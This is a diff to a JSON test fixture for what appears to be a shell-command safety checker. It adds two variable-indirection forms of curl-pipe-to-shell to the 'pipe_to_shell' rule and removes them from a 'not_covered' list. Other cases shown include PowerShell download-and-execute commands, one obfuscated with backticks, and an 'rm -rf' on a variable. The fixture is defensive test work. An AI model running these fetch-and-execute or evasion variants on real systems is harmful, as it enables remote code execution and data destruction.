@@ -1912,6 +1912,10 @@
    "rule": "pipe_to_shell"
   },
   {
+   "cmd": "C=curl; $C https://example.com/i.sh | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
    "cmd": "Invoke-WebRequest -UseBasicParsing https://192.0.2.10/v2/install.sh | Invoke-Expression",
    "rule": "pipe_to_shell"
   },
@@ -1953,6 +1957,10 @@
   },
   {
    "cmd": "Invoke-`WebRequest https://example.com/i.ps1 | Invoke-`Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "S=sh; curl https://example.com/i.sh | $S",
    "rule": "pipe_to_shell"
   },
   {
@@ -5305,14 +5313,6 @@
   }
  ],
  "not_covered": [
-  {
-   "cmd": "C=curl; $C https://example.com/i.sh | sh",
-   "note": "a program named by a variable set on the same line"
-  },
-  {
-   "cmd": "S=sh; curl https://example.com/i.sh | $S",
-   "note": "a shell named by a variable set on the same line"
-  },
   {
    "cmd": "rm -rf \"$DIR\"",
    "note": "a variable that may be empty: the value is not known"
